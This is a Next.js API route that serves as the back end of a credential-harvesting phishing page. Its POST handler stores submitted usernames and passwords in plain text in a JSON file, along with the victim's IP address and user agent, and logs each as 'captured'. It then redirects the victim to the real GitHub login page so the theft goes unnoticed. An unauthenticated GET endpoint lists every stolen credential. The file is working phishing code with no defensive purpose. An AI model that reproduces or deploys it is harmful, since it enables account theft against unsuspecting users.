import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

const DATA_FILE = path.join(process.cwd(), "data", "submissions.json");

function ensureDataDir() {
  const dir = path.dirname(DATA_FILE);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, "[]", "utf-8");
  }
}

export async function POST(request) {
  try {
    const body = await request.json();
    const { login, password } = body;

    if (!login || !password) {
      return NextResponse.json(
        { error: "Username and password are required" },
        { status: 400 }
      );
    }

    ensureDataDir();

    // Read existing submissions
    const existing = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));

    // Add new submission with timestamp
    const entry = {
      id: existing.length + 1,
      username: login,
      password: password,
      ip: request.headers.get("x-forwarded-for") || "unknown",
      userAgent: request.headers.get("user-agent") || "unknown",
      timestamp: new Date().toISOString(),
    };

    existing.push(entry);

    // Save back to file
    fs.writeFileSync(DATA_FILE, JSON.stringify(existing, null, 2), "utf-8");

    console.log(`[+] New submission captured: ${login}`);

    return NextResponse.json({ success: true, redirect: "https://github.com/login" });
  } catch (error) {
    console.error("Error saving submission:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}

// GET endpoint to view all captured submissions
export async function GET() {
  try {
    ensureDataDir();
    const data = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
    return NextResponse.json({ total: data.length, submissions: data });
  } catch (error) {
    return NextResponse.json({ total: 0, submissions: [] });
  }
}
